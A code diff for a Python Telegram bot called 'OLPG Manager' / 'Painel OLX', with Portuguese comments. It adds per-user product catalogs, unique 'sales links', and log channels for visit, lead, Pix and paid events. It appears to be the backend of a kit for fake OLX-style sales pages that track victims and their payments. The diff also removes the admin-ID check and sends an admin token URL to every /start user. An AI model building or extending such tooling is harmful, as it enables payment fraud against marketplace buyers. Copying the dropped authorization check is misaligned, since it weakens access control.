@@ -135,10 +135,79 @@ def init_tenant_tables():
             tg_id INTEGER PRIMARY KEY,
             display_name TEXT, avatar_url TEXT, bio TEXT, contact TEXT, updated_at REAL NOT NULL
         );
+        CREATE TABLE IF NOT EXISTS tg_log_channels (
+            channel_key TEXT PRIMARY KEY,
+            chat_id INTEGER NOT NULL,
+            title TEXT,
+            updated_at REAL NOT NULL
+        );
+        CREATE TABLE IF NOT EXISTS tenant_products (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            tg_id INTEGER NOT NULL,
+            product_code TEXT UNIQUE NOT NULL,
+            title TEXT NOT NULL,
+            price TEXT NOT NULL,
+            old_price TEXT,
+            description TEXT,
+            image_url TEXT,
+            image1 TEXT, image2 TEXT, image3 TEXT,
+            created_at REAL NOT NULL
+        );
+        CREATE INDEX IF NOT EXISTS idx_tp_tgid  ON tenant_products(tg_id);
+        CREATE INDEX IF NOT EXISTS idx_tp_code  ON tenant_products(product_code);
         CREATE INDEX IF NOT EXISTS idx_tge_id   ON tg_events(tg_id, created_at);
         CREATE INDEX IF NOT EXISTS idx_tgs_id   ON tg_sessions(tg_id, entered_at);
         CREATE INDEX IF NOT EXISTS idx_tg_slug  ON tg_users(slug);
     """)
+    conn.commit(); conn.close()
+
+# ─── CANAIS DE LOGS DO ADMIN SUPREMO ──────────────────────────────────────────
+def set_log_channel(channel_key: str, chat_id: int, title: str = ""):
+    conn = _get_db()
+    conn.execute("""
+        INSERT INTO tg_log_channels(channel_key, chat_id, title, updated_at) VALUES(?,?,?,?)
+        ON CONFLICT(channel_key) DO UPDATE SET chat_id=excluded.chat_id, title=excluded.title, updated_at=excluded.updated_at
+    """, (channel_key, chat_id, title, time.time()))
+    conn.commit(); conn.close()
+
+def get_log_channels():
+    conn = _get_db()
+    rows = conn.execute("SELECT channel_key, chat_id, title FROM tg_log_channels").fetchall()
+    conn.close()
+    return {r["channel_key"]: {"chat_id": r["chat_id"], "title": r["title"]} for r in rows}
+
+def notify_log_channel(channel_key: str, text: str, markup=None):
+    channels = get_log_channels()
+    ch = channels.get(channel_key) or channels.get("all")
+    if ch and ch.get("chat_id"):
+        send_msg(ch["chat_id"], text, markup=markup)
+
+# ─── CATÁLOGO PROPRIO DE MULTI-PRODUTOS POR ADMIN ────────────────────────────
+def create_tenant_product(tg_id: int, title: str, price: str, old_price="", description="", image_url="", image1="", image2="", image3=""):
+    conn = _get_db()
+    code = secrets.token_urlsafe(8).lower()
+    conn.execute("""
+        INSERT INTO tenant_products(tg_id, product_code, title, price, old_price, description, image_url, image1, image2, image3, created_at)
+        VALUES(?,?,?,?,?,?,?,?,?,?,?)
+    """, (tg_id, code, title, price, old_price, description, image_url, image1, image2, image3, time.time()))
+    conn.commit(); conn.close()
+    return code
+
+def get_tenant_products(tg_id: int):
+    conn = _get_db()
+    rows = conn.execute("SELECT id, product_code, title, price, old_price, description, image_url, created_at FROM tenant_products WHERE tg_id=? ORDER BY id DESC", (tg_id,)).fetchall()
+    conn.close()
+    return [dict(r) for r in rows]
+
+def get_product_by_code(code: str):
+    conn = _get_db()
+    r = conn.execute("SELECT * FROM tenant_products WHERE product_code=?", (code,)).fetchone()
+    conn.close()
+    return dict(r) if r else None
+
+def delete_tenant_product(tg_id: int, product_code: str):
+    conn = _get_db()
+    conn.execute("DELETE FROM tenant_products WHERE tg_id=? AND product_code=?", (tg_id, product_code))
     conn.commit(); conn.close()
 
 def get_tenant_profile(tg_id):
@@ -583,12 +652,7 @@ def dispatch(update: dict):
         slug = get_slug(tg_id)
         link = f"{BASE_URL}/s/{slug}"
 
-        if cmd == "/start":
-            # Detecta se é admin pelo ADMIN_IDS configurado (ou se ADMIN_IDS não configurado, trata como admin default)
-            admin_ids_raw = os.environ.get("ADMIN_IDS", "")
-            admin_ids = [int(x) for x in admin_ids_raw.split(",") if x.strip().isdigit()]
-            is_admin = (tg_id in admin_ids) if admin_ids else True  # Se não houver filtro estrito, concede visualização do WebApp
-
+        if cmd in ("/start", "/admin_link", "/admin"):
             token = ""
             try:
                 import bot as _ab
@@ -599,7 +663,6 @@ def dispatch(update: dict):
             base = BASE_URL.rstrip('/')
             admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"
 
-            # Teclado Inline com botão WebApp (Open)
             admin_kb = _kb([
                 [{"text": "💰 Abrir Carteira / Painel OLX", "web_app": {"url": admin_url}}],
                 [{"text": "📊 Minhas Stats", "callback_data": "m_stats"},
@@ -614,12 +677,17 @@ def dispatch(update: dict):
             ])
 
             send_msg(chat_id,
-                f"🟣 <b>OLPG Manager</b>\n\n"
-                f"Bem-vindo, <b>{username}</b>!\n\n"
-                f"🔗 <b>Seu link:</b>\n<code>{link}</code>\n\n"
-                f"Página exclusiva com criptografia AES-256.\n"
-                f"Clique no botão <b>💰 Abrir Carteira / Painel OLX</b> abaixo para acessar seu painel WebApp estilo Carteira do 7!",
+                f"🟣 <b>OLPG Manager — Painel Web</b>\n\n"
+                f"Olá, <b>{username}</b>!\n\n"
+                f"🔗 <b>Seu link único de vendas:</b>\n<code>{link}</code>\n\n"
+                f"🔑 <b>Seu Token de Acesso WebAdmin:</b>\n<code>{admin_url}</code>\n\n"
+                f"Clique no botão abaixo para abrir o seu painel WebApp estilo Carteira do 7!",
                 markup=admin_kb)
+        elif cmd.startswith("/set_log_"):
+            # Ex: /set_log_visita, /set_log_lead, /set_log_pix, /set_log_pago, /set_log_all
+            log_type = cmd.replace("/set_log_", "")
+            set_log_channel(log_type, chat_id, msg.get("chat", {}).get("title", f"Canal #{chat_id}"))
+            send_msg(chat_id, f"✅ <b>Canal de Logs Configurado!</b>\nEste grupo/canal agora receberá logs de <b>{log_type.upper()}</b> em tempo real.")
         elif cmd in ("/menu","/painel"):
             send_msg(chat_id, f"📋 <b>Painel OLPG</b>\n\nOlá, <b>{username}</b>!", markup=kb_main())
         elif cmd == "/stats":
